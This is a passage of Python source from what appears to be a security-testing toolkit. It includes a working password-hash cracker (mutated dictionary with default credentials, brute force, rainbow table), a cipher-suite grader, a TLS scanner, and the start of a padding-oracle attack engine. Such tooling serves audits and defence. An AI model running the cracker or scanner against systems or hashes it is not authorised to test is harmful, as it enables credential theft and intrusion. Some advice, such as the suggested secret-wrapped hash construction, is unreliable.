                128: ["sha512"],
            }
            hex_len = len(hash_str)
            if hex_len in length_map and all(c in string.hexdigits for c in hash_str):
                candidates = length_map[hex_len]

        self._stats["hashes_analyzed"] += 1
        return candidates

    def _hash_compute(self, algorithm: str, plaintext: str, salt: str = "") -> str:
        """Compute a hash with the given algorithm."""
        data = plaintext.encode("utf-8")
        salt_bytes = salt.encode("utf-8") if salt else b""

        if algorithm == "md5":
            return hashlib.md5(salt_bytes + data).hexdigest()
        elif algorithm == "sha1":
            return hashlib.sha1(salt_bytes + data).hexdigest()
        elif algorithm == "sha224":
            return hashlib.sha224(salt_bytes + data).hexdigest()
        elif algorithm == "sha256":
            return hashlib.sha256(salt_bytes + data).hexdigest()
        elif algorithm == "sha384":
            return hashlib.sha384(salt_bytes + data).hexdigest()
        elif algorithm == "sha512":
            return hashlib.sha512(salt_bytes + data).hexdigest()
        elif algorithm == "ntlm":
            return hashlib.new(
                "md4", data.decode("utf-8").encode("utf-16le")
            ).hexdigest()
        elif algorithm == "mysql323":
            nr = 1345345333
            add = 7
            nr2 = 0x12345671
            for ch in data:
                if ch in (ord(" "), ord("\t")):
                    continue
                nr ^= (((nr & 63) + add) * ch) + (nr << 8)
                nr &= 0xFFFFFFFF
                nr2 += (nr2 << 8) ^ nr
                nr2 &= 0xFFFFFFFF
                add += ch
                add &= 0xFFFFFFFF
            return f"{nr & 0x7FFFFFFF:08x}{nr2 & 0x7FFFFFFF:08x}"
        else:
            try:
                return hashlib.new(algorithm, salt_bytes + data).hexdigest()
            except ValueError:
                return hashlib.sha256(salt_bytes + data).hexdigest()

    def _apply_rules(self, word: str) -> Generator[str, None, None]:
        """Apply mutation rules to a word for dictionary attack."""
        yield word
        yield word.lower()
        yield word.upper()
        yield word.capitalize()
        yield word.swapcase()
        yield word[::-1]

        # Append numbers
        for n in range(0, 100):
            yield f"{word}{n}"
        for n in range(1990, 2027):
            yield f"{word}{n}"

        # Prepend numbers
        for n in range(0, 10):
            yield f"{n}{word}"

        # Common suffixes
        for suffix in [
            "!",
            "@",
            "#",
            "$",
            "123",
            "1234",
            "12345",
            "!",
            "!!",
            "!!!",
            "?",
            ".",
        ]:
            yield f"{word}{suffix}"

        # Common prefixes
        for prefix in ["!", "@", "#", "the", "my", "a_"]:
            yield f"{prefix}{word}"

        # Leet speak
        leet_map = {
            "a": "4",
            "e": "3",
            "i": "1",
            "o": "0",
            "s": "5",
            "t": "7",
            "l": "1",
        }
        leet = word
        for orig, repl in leet_map.items():
            leet = leet.replace(orig, repl)
        if leet != word:
            yield leet

        leet_upper = word.upper()
        for orig, repl in leet_map.items():
            leet_upper = leet_upper.replace(orig.upper(), repl)
        if leet_upper != word.upper():
            yield leet_upper

        # Double word
        yield word * 2
        yield f"{word}_{word}"

    def _generate_wordlist(self) -> Generator[str, None, None]:
        """Generate wordlist from config or built-in."""
        if self.config.hash_wordlist_path and os.path.isfile(
            self.config.hash_wordlist_path
        ):
            try:
                with open(
                    self.config.hash_wordlist_path,
                    "r",
                    encoding="utf-8",
                    errors="ignore",
                ) as f:
                    for line in f:
                        word = line.strip()
                        if word:
                            yield from self._apply_rules(word)
            except Exception as exc:
                logger.warning("Failed to read wordlist: %s", exc)

        # Built-in common passwords
        builtin = [
            "password",
            "123456",
            "12345678",
            "qwerty",
            "abc123",
            "monkey",
            "master",
            "dragon",
            "111111",
            "baseball",
            "iloveyou",
            "trustno1",
            "sunshine",
            "ashley",
            "football",
            "shadow",
            "michael",
            "charlie",
            "jennifer",
            "pass",
            "letmein",
            "admin",
            "administrator",
            "root",
            "toor",
            "test",
            "guest",
            "info",
            "adm",
            "mysql",
            "user",
            "login",
            "welcome",
            "solo",
            "ftp",
            "changeme",
            "server",
            "oracle",
            "database",
            "postgres",
            "redis",
            "mongo",
            "default",
            "demo",
            "access",
            "1234567890",
            "passwd",
            "secret",
            "supersecret",
            "god",
        ]
        for word in builtin:
            yield from self._apply_rules(word)

    def _brute_force_generator(self) -> Generator[str, None, None]:
        """Generate brute-force candidates."""
        charset = self.config.hash_brute_charset
        for length in range(1, self.config.hash_max_brute_length + 1):
            yield from self._brute_recurse(charset, length, "")

    @staticmethod
    def _brute_recurse(
        charset: str, remaining: int, current: str
    ) -> Generator[str, None, None]:
        """Recursive brute-force generator."""
        if remaining == 0:
            yield current
            return
        for ch in charset:
            yield from HashEngine._brute_recurse(charset, remaining - 1, current + ch)

    def build_rainbow_table(
        self, algorithm: str, wordlist: Optional[List[str]] = None
    ) -> int:
        """Build an in-memory rainbow table for fast lookup."""
        if algorithm in self._rainbow_tables:
            return len(self._rainbow_tables[algorithm])

        table: Dict[str, str] = {}
        words = wordlist or list(self._generate_wordlist())

        for word in words:
            h = self._hash_compute(algorithm, word)
            table[h] = word

        self._rainbow_tables[algorithm] = table
        logger.info("Built rainbow table for %s: %d entries", algorithm, len(table))
        return len(table)

    def crack_hash(
        self,
        hash_str: str,
        algorithm: Optional[str] = None,
        salt: str = "",
    ) -> HashResult:
        """Attempt to crack a hash using dictionary + brute-force + rainbow."""
        start = time.time()
        hash_str = hash_str.strip().lower()

        # Identify algorithm if not specified
        if not algorithm:
            candidates = self.identify_hash(hash_str)
            if not candidates:
                return HashResult(
                    original_hash=hash_str,
                    algorithm="unknown",
                    cracked=False,
                    method="identification_failed",
                )
            algorithm = candidates[0]

        attempts = 0

        # Phase 1: Rainbow table lookup
        if algorithm in self._rainbow_tables:
            if hash_str in self._rainbow_tables[algorithm]:
                plaintext = self._rainbow_tables[algorithm][hash_str]
                duration = (time.time() - start) * 1000
                self._stats["hashes_cracked"] += 1
                return HashResult(
                    original_hash=hash_str,
                    algorithm=algorithm,
                    cracked=True,
                    plaintext=plaintext,
                    method="rainbow_table",
                    attempts=1,
                    duration_ms=duration,
                    confidence=1.0,
                )

        # Phase 2: Dictionary attack with rules
        for word in self._generate_wordlist():
            attempts += 1
            computed = self._hash_compute(algorithm, word, salt)
            if computed.lower() == hash_str:
                duration = (time.time() - start) * 1000
                self._stats["hashes_cracked"] += 1
                self._stats["total_attempts"] += attempts
                return HashResult(
                    original_hash=hash_str,
                    algorithm=algorithm,
                    cracked=True,
                    plaintext=word,
                    method="dictionary",
                    attempts=attempts,
                    duration_ms=duration,
                    confidence=1.0,
                )

            # Time limit check
            if time.time() - start > self.config.max_hash_crack_time:
                break

        # Phase 3: Brute-force (short passwords only)
        if time.time() - start < self.config.max_hash_crack_time:
            for candidate in self._brute_force_generator():
                attempts += 1
                computed = self._hash_compute(algorithm, candidate, salt)
                if computed.lower() == hash_str:
                    duration = (time.time() - start) * 1000
                    self._stats["hashes_cracked"] += 1
                    self._stats["total_attempts"] += attempts
                    return HashResult(
                        original_hash=hash_str,
                        algorithm=algorithm,
                        cracked=True,
                        plaintext=candidate,
                        method="brute_force",
                        attempts=attempts,
                        duration_ms=duration,
                        confidence=1.0,
                    )

                if time.time() - start > self.config.max_hash_crack_time:
                    break

        duration = (time.time() - start) * 1000
        self._stats["total_attempts"] += attempts
        return HashResult(
            original_hash=hash_str,
            algorithm=algorithm,
            cracked=False,
            method="exhausted",
            attempts=attempts,
            duration_ms=duration,
        )

    def detect_hash_length_extension(
        self, hash_str: str, algorithm: str
    ) -> Optional[CryptoFinding]:
        """Detect if a hash is vulnerable to length extension attacks."""
        vulnerable_algos = {"md5", "sha1", "sha256", "sha512"}

        if algorithm.lower() in vulnerable_algos:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.HASH_LENGTH_EXTENSION,
                severity=CryptoSeverity.MEDIUM,
                title=f"Hash Length Extension Vulnerability ({algorithm.upper()})",
                description=(
                    f"The hash uses {algorithm.upper()} which is vulnerable to length extension attacks. "
                    "An attacker who knows H(secret||message) can compute H(secret||message||padding||extra) "
                    "without knowing the secret."
                ),
                evidence=f"Hash: {hash_str}\nAlgorithm: {algorithm}",
                impact=(
                    "API signature bypass if the application uses H(secret||data) for authentication. "
                    "Attacker can append arbitrary data to signed messages."
                ),
                remediation=(
                    "1. Use HMAC instead of H(secret||data)\n"
                    "2. Use SHA-3, BLAKE2, or truncated hashes\n"
                    "3. Use H(secret||data||secret) double keying\n"
                    "4. Switch to a proper MAC construction"
                ),
                cvss_score=6.5,
                cwe_id="CWE-328",
                metadata={"algorithm": algorithm, "hash": hash_str},
            )
            self.findings.append(finding)
            return finding
        return None

    async def analyze_and_crack(
        self, hashes: List[str], algorithms: Optional[List[str]] = None
    ) -> List[HashResult]:
        """Analyze and attempt to crack multiple hashes."""
        results = []
        for i, h in enumerate(hashes):
            algo = algorithms[i] if algorithms and i < len(algorithms) else None
            result = self.crack_hash(h, algo)
            results.append(result)

            if result.cracked:
                finding = CryptoFinding(
                    attack_type=(
                        CryptoAttackType.HASH_CRACK_DICT
                        if result.method == "dictionary"
                        else CryptoAttackType.HASH_CRACK_BRUTE
                    ),
                    severity=CryptoSeverity.HIGH,
                    title=f"Hash Cracked: {result.algorithm.upper()}",
                    description=(
                        f"Successfully cracked {result.algorithm} hash via {result.method}. "
                        f"Plaintext: '{result.plaintext}' ({result.attempts} attempts, "
                        f"{result.duration_ms:.1f}ms)"
                    ),
                    evidence=(
                        f"Hash: {result.original_hash}\n"
                        f"Plaintext: {result.plaintext}\n"
                        f"Method: {result.method}"
                    ),
                    impact="Credential exposure. Password reuse across services.",
                    remediation=(
                        "1. Use bcrypt, scrypt, or argon2 for password hashing\n"
                        "2. Enforce strong password policies\n"
                        "3. Implement account lockout after failed attempts\n"
                        "4. Add unique per-user salts"
                    ),
                    cvss_score=7.5,
                    cwe_id="CWE-916",
                    metadata=result.__dict__,
                )
                self.findings.append(finding)

        return results

    @property
    def stats(self) -> Dict[str, int]:
        return dict(self._stats)


# =========================================================================
#  CIPHER SUITE ANALYZER
# =========================================================================


class CipherAnalyzer:
    """
    Analyze cipher suites, detect weak algorithms, assess key sizes,
    and evaluate TLS configurations.

    Capabilities:
    - Parse and classify cipher suite strings
    - Check for weak/deprecated algorithms (RC4, DES, 3DES, NULL, EXPORT)
    - Evaluate key exchange strength (RSA vs ECDHE/DHE)
    - Detect missing forward secrecy
    - Assess MAC algorithm strength
    - Grade cipher configurations (A-F)
    - Recommend secure alternatives
    """

    # Cipher suite component patterns
    KX_PATTERNS = {
        "ECDHE": ("ECDHE", True),
        "DHE": ("DHE", True),
        "EDH": ("DHE", True),
        "RSA": ("RSA", False),
        "ECDH": ("ECDH", False),
        "DH": ("DH", False),
        "ADH": ("ADH_anon", False),
        "AECDH": ("AECDH_anon", False),
        "PSK": ("PSK", False),
        "SRP": ("SRP", False),
    }

    CIPHER_STRENGTH = {
        "AES-256-GCM": {"bits": 256, "mode": "GCM", "secure": True},
        "AES-128-GCM": {"bits": 128, "mode": "GCM", "secure": True},
        "AES-256-CBC": {"bits": 256, "mode": "CBC", "secure": True},
        "AES-128-CBC": {"bits": 128, "mode": "CBC", "secure": True},
        "AES-256-CCM": {"bits": 256, "mode": "CCM", "secure": True},
        "AES-128-CCM": {"bits": 128, "mode": "CCM", "secure": True},
        "CHACHA20-POLY1305": {"bits": 256, "mode": "AEAD", "secure": True},
        "CAMELLIA-256-CBC": {"bits": 256, "mode": "CBC", "secure": True},
        "CAMELLIA-128-CBC": {"bits": 128, "mode": "CBC", "secure": True},
        "3DES-CBC": {"bits": 112, "mode": "CBC", "secure": False},
        "DES-CBC": {"bits": 56, "mode": "CBC", "secure": False},
        "RC4": {"bits": 128, "mode": "stream", "secure": False},
        "RC2-CBC": {"bits": 128, "mode": "CBC", "secure": False},
        "NULL": {"bits": 0, "mode": "none", "secure": False},
        "IDEA-CBC": {"bits": 128, "mode": "CBC", "secure": False},
        "SEED-CBC": {"bits": 128, "mode": "CBC", "secure": False},
    }

    MAC_STRENGTH = {
        "SHA384": {"bits": 384, "secure": True},
        "SHA256": {"bits": 256, "secure": True},
        "SHA1": {"bits": 160, "secure": False},
        "MD5": {"bits": 128, "secure": False},
        "AEAD": {"bits": 0, "secure": True},  # GCM/CCM/Poly1305
    }

    def __init__(self):
        self.findings: List[CryptoFinding] = []

    def parse_cipher_suite(self, cipher_string: str) -> CipherInfo:
        """Parse an OpenSSL cipher suite string into components."""
        parts = cipher_string.split("-")
        info = CipherInfo(name=cipher_string, protocol="TLS")

        # Detect key exchange
        for prefix, (kx_name, has_fs) in self.KX_PATTERNS.items():
            if cipher_string.startswith(prefix) or f"-{prefix}-" in cipher_string:
                info.key_exchange = kx_name
                break

        if not info.key_exchange:
            info.key_exchange = "RSA"  # Default

        # Detect encryption algorithm
        cipher_str_upper = cipher_string.upper()
        for cipher_name, props in self.CIPHER_STRENGTH.items():
            normalized = cipher_name.replace("-", "")
            if normalized in cipher_str_upper.replace("-", ""):
                info.encryption = cipher_name
                info.key_size = props["bits"]
                info.is_weak = not props["secure"]
                break

        # Detect MAC
        for mac_name, props in self.MAC_STRENGTH.items():
            if mac_name in cipher_str_upper:
                info.mac = mac_name
                break

        # Check if cipher is in known weak set
        if cipher_string in WEAK_CIPHERS:
            info.is_weak = True

        # Add notes about weaknesses
        if info.is_weak:
            if "RC4" in cipher_string:
                info.notes.append("RC4 is broken — RFC 7465 prohibits its use")
            if "DES" in cipher_string and "3DES" not in cipher_string:
                info.notes.append("DES has only 56-bit key — trivially breakable")
            if "3DES" in cipher_string:
                info.notes.append(
                    "3DES is deprecated — vulnerable to Sweet32 (CVE-2016-2183)"
                )
            if "NULL" in cipher_string:
                info.notes.append("NULL cipher — no encryption at all!")
            if "EXPORT" in cipher_string:
                info.notes.append("EXPORT cipher — intentionally weakened (40-56 bit)")
            if (
                "anon" in cipher_string.lower()
                or "ADH" in cipher_string
                or "AECDH" in cipher_string
            ):
                info.notes.append(
                    "Anonymous key exchange — no authentication, vulnerable to MITM"
                )

        if info.mac == "MD5":
            info.notes.append("MD5 MAC is considered weak")
        if info.mac == "SHA1":
            info.notes.append("SHA1 MAC is deprecated for TLS")

        if info.key_exchange == "RSA" and not cipher_string.startswith("ECDHE"):
            info.notes.append(
                "No forward secrecy — compromised key decrypts past traffic"
            )

        return info

    def analyze_cipher_list(self, ciphers: List[str]) -> List[CipherInfo]:
        """Analyze a list of cipher suites."""
        results = []
        for cipher in ciphers:
            info = self.parse_cipher_suite(cipher)
            results.append(info)

            if info.is_weak:
                finding = CryptoFinding(
                    attack_type=CryptoAttackType.WEAK_CIPHER,
                    severity=(
                        CryptoSeverity.HIGH
                        if info.key_size < 64
                        else CryptoSeverity.MEDIUM
                    ),
                    title=f"Weak Cipher Suite: {cipher}",
                    description=(
                        f"The server supports weak cipher suite '{cipher}'. "
                        f"Key size: {info.key_size} bits, Mode: {info.encryption}."
                    ),
                    evidence=f"Cipher: {cipher}\nKey size: {info.key_size}\nNotes: {'; '.join(info.notes)}",
                    impact="Encrypted traffic may be decryptable by attackers.",
                    remediation=(
                        "Disable weak cipher suites. Recommended ciphers:\n"
                        "  TLS_AES_256_GCM_SHA384\n"
                        "  TLS_CHACHA20_POLY1305_SHA256\n"
                        "  TLS_AES_128_GCM_SHA256\n"
                        "  ECDHE-RSA-AES256-GCM-SHA384\n"
                        "  ECDHE-RSA-CHACHA20-POLY1305"
                    ),
                    cvss_score=5.9 if info.key_size >= 56 else 7.5,
                    cwe_id="CWE-327",
                    metadata={"cipher_info": info.__dict__},
                )
                self.findings.append(finding)

        return results

    def grade_configuration(self, ciphers: List[CipherInfo]) -> str:
        """Grade the overall cipher configuration A+ to F."""
        if not ciphers:
            return "F"

        has_null = any(c.key_size == 0 for c in ciphers)
        has_export = any("EXPORT" in c.name for c in ciphers)
        has_anon = any("anon" in c.key_exchange.lower() for c in ciphers)
        has_weak = any(c.is_weak for c in ciphers)
        all_aead = all(
            c.encryption and "GCM" in c.encryption or "POLY1305" in c.encryption
            for c in ciphers
            if c.encryption
        )
        all_fs = all(c.key_exchange in ("ECDHE", "DHE") for c in ciphers)
        all_256 = all(c.key_size >= 256 for c in ciphers if c.key_size > 0)

        if has_null or has_export or has_anon:
            return "F"
        if has_weak:
            return "C"
        if not all_fs:
            return "B"
        if all_aead and all_fs and all_256:
            return "A+"
        if all_aead and all_fs:
            return "A"
        return "B+"


# =========================================================================
#  TLS/SSL VULNERABILITY SCANNER
# =========================================================================


class TLSScanner:
    """
    TLS/SSL configuration scanner.

    Tests for:
    - Deprecated protocol versions (SSLv2, SSLv3, TLS 1.0, TLS 1.1)
    - Weak cipher suites
    - Certificate issues (expiry, self-signed, weak signature)
    - Missing HSTS
    - Compression (CRIME attack)
    - Renegotiation vulnerabilities
    - Heartbleed indicators
    - Key size adequacy
    - Certificate chain issues
    """

    def __init__(self, config: CryptoConfig):
        self.config = config
        self.cipher_analyzer = CipherAnalyzer()
        self.findings: List[CryptoFinding] = []

    async def scan_host(self, host: str, port: int = 443) -> TLSInfo:
        """Perform comprehensive TLS scan on a host."""
        tls_info = TLSInfo(host=host, port=port)

        # Test supported TLS versions
        await self._test_protocol_versions(tls_info)

        # Get certificate info
        await self._get_certificate_info(tls_info)

        # Get supported cipher suites
        await self._get_cipher_suites(tls_info)

        # Check for specific vulnerabilities
        await self._check_vulnerabilities(tls_info)

        return tls_info

    async def _test_protocol_versions(self, tls_info: TLSInfo) -> None:
        """Test which TLS/SSL protocol versions are supported."""
        for version_name in self.config.tls_check_versions:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                # Set version constraints
                ctx.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
                ctx.maximum_version = ssl.TLSVersion.MAXIMUM_SUPPORTED

                if version_name == "SSLv3":
                    try:
                        ctx.minimum_version = ssl.TLSVersion.SSLv3
                        ctx.maximum_version = ssl.TLSVersion.SSLv3
                    except (ValueError, AttributeError):
                        continue
                elif version_name == "TLSv1.0":
                    try:
                        ctx.minimum_version = ssl.TLSVersion.TLSv1
                        ctx.maximum_version = ssl.TLSVersion.TLSv1
                    except (ValueError, AttributeError):
                        continue
                elif version_name == "TLSv1.1":
                    try:
                        ctx.minimum_version = ssl.TLSVersion.TLSv1_1
                        ctx.maximum_version = ssl.TLSVersion.TLSv1_1
                    except (ValueError, AttributeError):
                        continue
                elif version_name == "TLSv1.2":
                    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                    ctx.maximum_version = ssl.TLSVersion.TLSv1_2
                elif version_name == "TLSv1.3":
                    ctx.minimum_version = ssl.TLSVersion.TLSv1_3
                    ctx.maximum_version = ssl.TLSVersion.TLSv1_3

                loop = asyncio.get_event_loop()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.config.tls_timeout)

                try:
                    await loop.run_in_executor(
                        None, sock.connect, (tls_info.host, tls_info.port)
                    )
                    ssock = ctx.wrap_socket(sock, server_hostname=tls_info.host)
                    tls_info.supported_versions.append(version_name)

                    if version_name in DEPRECATED_TLS:
                        finding = CryptoFinding(
                            attack_type=CryptoAttackType.TLS_DOWNGRADE,
                            severity=(
                                CryptoSeverity.HIGH
                                if version_name in ("SSLv2", "SSLv3")
                                else CryptoSeverity.MEDIUM
                            ),
                            title=f"Deprecated Protocol: {version_name}",
                            description=(
                                f"The server supports {version_name} which is deprecated "
                                "and has known vulnerabilities."
                            ),
                            evidence=f"Host: {tls_info.host}:{tls_info.port}\nProtocol: {version_name}",
                            impact=self._get_protocol_impact(version_name),
                            remediation=f"Disable {version_name} on the server. Use TLS 1.2+ only.",
                            cvss_score=(
                                7.5 if version_name in ("SSLv2", "SSLv3") else 5.3
                            ),
                            cwe_id="CWE-326",
                            target=f"{tls_info.host}:{tls_info.port}",
                        )
                        self.findings.append(finding)
                        tls_info.vulnerabilities.append(
                            f"Supports deprecated {version_name}"
                        )

                    ssock.close()
                except (ssl.SSLError, socket.error, OSError):
                    pass
                finally:
                    try:
                        sock.close()
                    except Exception:
                        pass
            except Exception as exc:
                logger.debug("Error testing %s: %s", version_name, exc)

    async def _get_certificate_info(self, tls_info: TLSInfo) -> None:
        """Retrieve and analyze the server's certificate."""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            loop = asyncio.get_event_loop()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.tls_timeout)

            try:
                await loop.run_in_executor(
                    None, sock.connect, (tls_info.host, tls_info.port)
                )
                ssock = ctx.wrap_socket(sock, server_hostname=tls_info.host)

                cert_der = ssock.getpeercert(binary_form=True)
                cert_dict = ssock.getpeercert()

                if cert_dict:
                    cert_info = CertificateInfo()

                    # Subject
                    subject = cert_dict.get("subject", ())
                    for rdn in subject:
                        for attr_type, attr_value in rdn:
                            cert_info.subject[attr_type] = attr_value

                    # Issuer
                    issuer = cert_dict.get("issuer", ())
                    for rdn in issuer:
                        for attr_type, attr_value in rdn:
                            cert_info.issuer[attr_type] = attr_value

                    cert_info.serial_number = str(cert_dict.get("serialNumber", ""))
                    cert_info.version = cert_dict.get("version", 0)
                    cert_info.not_before = cert_dict.get("notBefore", "")
                    cert_info.not_after = cert_dict.get("notAfter", "")

                    # Check expiry
                    try:
                        from email.utils import parsedate_to_datetime

                        not_after_dt = parsedate_to_datetime(cert_info.not_after)
                        import datetime

                        now = datetime.datetime.now(datetime.timezone.utc)
                        delta = not_after_dt - now
                        cert_info.days_until_expiry = delta.days
                        cert_info.is_expired = delta.days < 0
                    except Exception as e:
                        logger.debug("Certificate expiry calculation error: %s", e)

                    # Check self-signed
                    cert_info.is_self_signed = cert_info.subject == cert_info.issuer

                    # SAN
                    san = cert_dict.get("subjectAltName", ())
                    cert_info.san = [value for _, value in san]

                    # Check wildcard
                    cn = cert_info.subject.get("commonName", "")
                    cert_info.is_wildcard = cn.startswith("*.")

                    # OCSP
                    ocsp = cert_dict.get("OCSP", ())
                    cert_info.ocsp_urls = list(ocsp) if isinstance(ocsp, tuple) else []

                    # CRL
                    crl = cert_dict.get("crlDistributionPoints", ())
                    cert_info.crl_urls = list(crl) if isinstance(crl, tuple) else []

                    # Fingerprints
                    if cert_der:
                        cert_info.fingerprint_sha256 = hashlib.sha256(
                            cert_der
                        ).hexdigest()
                        cert_info.fingerprint_sha1 = hashlib.sha1(cert_der).hexdigest()

                    tls_info.certificate = cert_info

                    # Generate findings for certificate issues
                    self._analyze_certificate(cert_info, tls_info)

                ssock.close()
            except Exception as exc:
                logger.warning("Failed to get certificate: %s", exc)
            finally:
                try:
                    sock.close()
                except Exception:
                    pass
        except Exception as exc:
            logger.error("Certificate analysis error: %s", exc)

    def _analyze_certificate(self, cert: CertificateInfo, tls_info: TLSInfo) -> None:
        """Analyze certificate for vulnerabilities."""
        if cert.is_expired:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.CERT_EXPIRED,
                severity=CryptoSeverity.HIGH,
                title="Expired TLS Certificate",
                description=(
                    f"The server's TLS certificate expired {abs(cert.days_until_expiry)} days ago. "
                    f"Not After: {cert.not_after}"
                ),
                evidence=f"Expiry: {cert.not_after}\nDays expired: {abs(cert.days_until_expiry)}",
                impact="Browsers will show security warnings. Users may be trained to bypass warnings.",
                remediation="Renew the certificate immediately. Set up auto-renewal with Let's Encrypt.",
                cvss_score=5.3,
                cwe_id="CWE-298",
                target=f"{tls_info.host}:{tls_info.port}",
            )
            self.findings.append(finding)
            tls_info.vulnerabilities.append("Expired certificate")

        elif cert.days_until_expiry < 30:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.CERT_EXPIRED,
                severity=CryptoSeverity.LOW,
                title="TLS Certificate Expiring Soon",
                description=f"Certificate expires in {cert.days_until_expiry} days.",
                evidence=f"Expiry: {cert.not_after}\nDays remaining: {cert.days_until_expiry}",
                impact="Certificate will expire soon, causing service disruption.",
                remediation="Renew the certificate before it expires.",
                cvss_score=2.0,
                cwe_id="CWE-298",
                target=f"{tls_info.host}:{tls_info.port}",
            )
            self.findings.append(finding)

        if cert.is_self_signed:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.CERT_SELF_SIGNED,
                severity=CryptoSeverity.MEDIUM,
                title="Self-Signed TLS Certificate",
                description=(
                    "The server uses a self-signed certificate which is not trusted "
                    "by default. This may indicate a misconfiguration or test environment."
                ),
                evidence=f"Subject: {cert.subject}\nIssuer: {cert.issuer}",
                impact=(
                    "Man-in-the-middle attacks possible if clients don't properly "
                    "validate the certificate chain."
                ),
                remediation="Use a certificate from a trusted CA (e.g., Let's Encrypt).",
                cvss_score=4.8,
                cwe_id="CWE-295",
                target=f"{tls_info.host}:{tls_info.port}",
            )
            self.findings.append(finding)
            tls_info.vulnerabilities.append("Self-signed certificate")

        # Check if certificate matches hostname
        cn = cert.subject.get("commonName", "")
        all_names = [cn] + cert.san
        host_matches = False
        for name in all_names:
            if name == tls_info.host:
                host_matches = True
                break
            if name.startswith("*."):
                domain = name[2:]
                if tls_info.host.endswith(domain) and tls_info.host.count(
                    "."
                ) == name.count("."):
                    host_matches = True
                    break

        if not host_matches and cn:
            finding = CryptoFinding(
                attack_type=CryptoAttackType.CERT_WRONG_HOST,
                severity=CryptoSeverity.HIGH,
                title="Certificate Hostname Mismatch",
                description=(
                    f"The certificate's CN ({cn}) and SANs don't match "
                    f"the target host ({tls_info.host})."
                ),
                evidence=f"Hostname: {tls_info.host}\nCN: {cn}\nSANs: {cert.san}",
                impact="MITM possible. Browsers will show warnings.",
                remediation="Issue a certificate that includes the correct hostname.",
                cvss_score=5.9,
                cwe_id="CWE-297",
                target=f"{tls_info.host}:{tls_info.port}",
            )
            self.findings.append(finding)
            tls_info.vulnerabilities.append("Hostname mismatch")

    async def _get_cipher_suites(self, tls_info: TLSInfo) -> None:
        """Enumerate supported cipher suites."""
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            loop = asyncio.get_event_loop()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.tls_timeout)

            try:
                await loop.run_in_executor(
                    None, sock.connect, (tls_info.host, tls_info.port)
                )
                ssock = ctx.wrap_socket(sock, server_hostname=tls_info.host)

                cipher_info = ssock.cipher()
                if cipher_info:
                    cipher_name, proto, bits = cipher_info
                    parsed = self.cipher_analyzer.parse_cipher_suite(cipher_name)
                    parsed.protocol = proto
                    parsed.key_size = bits
                    tls_info.cipher_suites.append(parsed)

                # Get shared ciphers
                shared = ssock.shared_ciphers()
                if shared:
                    for cipher_name, proto, bits in shared:
                        parsed = self.cipher_analyzer.parse_cipher_suite(cipher_name)
                        parsed.protocol = proto
                        parsed.key_size = bits
                        if not any(
                            c.name == cipher_name for c in tls_info.cipher_suites
                        ):
                            tls_info.cipher_suites.append(parsed)

                ssock.close()
            except Exception as exc:
                logger.debug("Cipher enumeration error: %s", exc)
            finally:
                try:
                    sock.close()
                except Exception:
                    pass

            # Analyze found ciphers
            weak_ciphers = [c for c in tls_info.cipher_suites if c.is_weak]
            if weak_ciphers:
                for wc in weak_ciphers:
                    tls_info.vulnerabilities.append(f"Weak cipher: {wc.name}")

        except Exception as exc:
            logger.error("Cipher suite scan error: %s", exc)

    async def _check_vulnerabilities(self, tls_info: TLSInfo) -> None:
        """Check for specific TLS vulnerabilities."""
        # Check for compression (CRIME)
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            loop = asyncio.get_event_loop()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.tls_timeout)

            try:
                await loop.run_in_executor(
                    None, sock.connect, (tls_info.host, tls_info.port)
                )
                ssock = ctx.wrap_socket(sock, server_hostname=tls_info.host)

                compression = ssock.compression()
                if compression:
                    tls_info.supports_compression = True
                    tls_info.vulnerabilities.append("TLS compression enabled (CRIME)")

                    finding = CryptoFinding(
                        attack_type=CryptoAttackType.WEAK_CIPHER,
                        severity=CryptoSeverity.MEDIUM,
                        title="TLS Compression Enabled (CRIME Attack)",
                        description=(
                            "The server supports TLS compression, which is vulnerable to "
                            "the CRIME attack (CVE-2012-4929). An attacker can extract "
                            "secrets from encrypted TLS connections."
                        ),
                        evidence=f"Compression method: {compression}",
                        impact="Secret extraction from HTTPS sessions (session cookies, CSRF tokens).",
                        remediation="Disable TLS compression on the server.",
                        cvss_score=5.9,
                        cwe_id="CWE-310",
                        target=f"{tls_info.host}:{tls_info.port}",
                    )
                    self.findings.append(finding)

                ssock.close()
            except Exception as e:
                logger.warning("TLS socket close error: %s", e)
            finally:
                try:
                    sock.close()
                except Exception:
                    pass  # Socket cleanup — safe to swallow
        except Exception as e:
            logger.warning(
                "TLS compression test failed for target: %s", e, exc_info=True
            )

    @staticmethod
    def _get_protocol_impact(version: str) -> str:
        """Get impact description for a deprecated protocol."""
        impacts = {
            "SSLv2": (
                "SSLv2 has fundamental design flaws: weak MAC, no handshake protection, "
                "export cipher downgrade (DROWN attack - CVE-2016-0800)."
            ),
            "SSLv3": (
                "SSLv3 is vulnerable to POODLE attack (CVE-2014-3566) which allows "
                "plaintext extraction from CBC-mode encrypted connections."
            ),
            "TLSv1.0": (
                "TLS 1.0 is vulnerable to BEAST attack (CVE-2011-3389) and has "
                "weak cipher suite requirements. Deprecated by RFC 8996."
            ),
            "TLSv1.1": (
                "TLS 1.1 lacks modern cipher suites (no GCM/AEAD support) and "
                "is deprecated by RFC 8996."
            ),
        }
        return impacts.get(version, "Deprecated protocol with known vulnerabilities.")


# =========================================================================
#  PADDING ORACLE ATTACK ENGINE
# =========================================================================


class PaddingOracleEngine:
    """
    Padding Oracle attack implementation for CBC-mode block ciphers.

    Implements:
    - PKCS#7 padding validation
    - Byte-by-byte decryption via oracle queries
